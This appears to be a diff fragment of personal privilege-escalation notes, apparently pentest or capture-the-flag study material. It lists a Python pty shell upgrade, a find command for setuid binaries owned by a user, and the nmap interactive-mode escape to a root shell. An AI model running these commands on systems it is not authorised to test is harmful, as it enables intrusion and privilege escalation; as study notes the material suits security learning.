@@ -76,5 +76,9 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 su <name>
 password:
 
+set of user id with perm 4000
+find / -user <name> -perm -4000
 
+nmap --interactive
+!sh
 
